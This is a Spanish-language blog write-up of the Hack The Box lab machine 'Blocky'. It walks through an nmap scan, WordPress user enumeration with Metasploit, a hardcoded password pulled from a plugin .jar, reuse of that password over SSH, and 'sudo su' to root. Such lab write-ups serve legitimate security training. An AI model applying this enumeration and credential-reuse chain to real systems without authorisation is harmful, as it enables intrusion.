---
layout: post
title:  "Writeup — HTB Blocky"
date:   2017-12-10 13:13:13
author: Andoni A.
categories: Writeups
tags: linux writeup seguridad ctf
cover: "/assets/hacking_header.jpg"
---

Buenas, aprovechando que retiraban esta máquina, **Blocky**, de [HTB](hackthebox.eu) (hasta que no los retiran no está permitido publicar writeups sobre sus retos) quería
publicar mi primer writeup.

Esta máquina era bastante sencilla, lo más dificil era no perder el tiempo siguiendo alguna
"pista falsa".

- Como casi siempre, empezamos lanzando un escaneo con NMAP, veo un FTP, SSH y un Apache:
```
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|_  256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
```
  - El Apache aloja a simple vista un WordPress, parece simular ser la web de un
   server de Minecraft.


- Con un módulo de enumeración de usuariosde WP descubrimos el usuario 'notch':
```
msf auxiliary(wordpress_login_enum) > run -j
[*] Auxiliary module running as background job 7.
[*] / - WordPress Version 4.8 detected
[*] 10.10.10.37:80 - / - WordPress User-Enumeration - Running User Enumeration
[+] / - Found user 'notch' with id 1
[+] / - Usernames stored in: /root/.msf4/loot/20171206134659_default_10.10.10.37_wordpress.users_138712.txt
```

  - Pruebo un par de contraseñas a mano pero nada...


- Para ver que más puede contener la web uso [dirb](https://tools.kali.org/web-applications/dirb) y descubro algunas urls
interesantes como:
  - http://10.10.10.37/phpmyadmin
    - Probamos el usuario notch con varias claves, nada...
  - http://10.10.10.37/plugins/
    - Contiene un par de .jar que descargo para ver si tienen algo interesante.


- Empiezo por 'BlockyCore.jar' ya que parece más "custom" que 'griefprevention-1.11.2-3.1.1.298.jar' y puede que tenga algún fallo:
  ```
  venom :: Machines/Blocky/BlockyCore_jar » strings com/myfirstplugin/BlockyCore.class
  com/myfirstplugin/BlockyCore
  java/lang/Object
  sqlHost
  Ljava/lang/String;
  sqlUser
  sqlPass
  <init>
  Code
          localhost
  root
  8YsqfCTnvxAUeduzjNSXe22
  LineNumberTable
  LocalVariableTable
  this
  Lcom/myfirstplugin/BlockyCore;
  onServerStart
  onServerStop
  onPlayerJoin
  TODO get username
  !Welcome to the BlockyCraft!!!!!!!
  sendMessage
  '(Ljava/lang/String;Ljava/lang/String;)V
  username
  message
  SourceFile
  BlockyCore.java
  ```

- Veo lo que parece un user/pass:
  ```
  root
  8YsqfCTnvxAUeduzjNSXe22
  ```

- Probamos en el login de WP pero no funciona, pruebo por SSH:
  ```
    venom :: Machines/Blocky » ssh root@10.10.10.37
    root@10.10.10.37's password:

    venom :: Machines/Blocky » ssh notch@10.10.10.37        
    notch@10.10.10.37's password:
    Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage

    7 packages can be updated.
    7 updates are security updates.

    Last login: Fri Dec  8 02:16:15 2017 from 10.10.14.79
    notch@Blocky:~$
  ```
    - En el home de notch tenemos la **flag** del user.


- Y después con un simple 'sudo su' accedo al usuario 'root' y obtengo la flag.

Como he dicho, esta máquina era bastante sencilla aunque me costó un buen rato encontrar algo dentro de los .jar...

Espero poder sacar un rato y subir alguno de los retos que me parecieron
interesantes del CTF de la HoneyCON17.

*~ Saludos y que la fuerza os acompañe!*
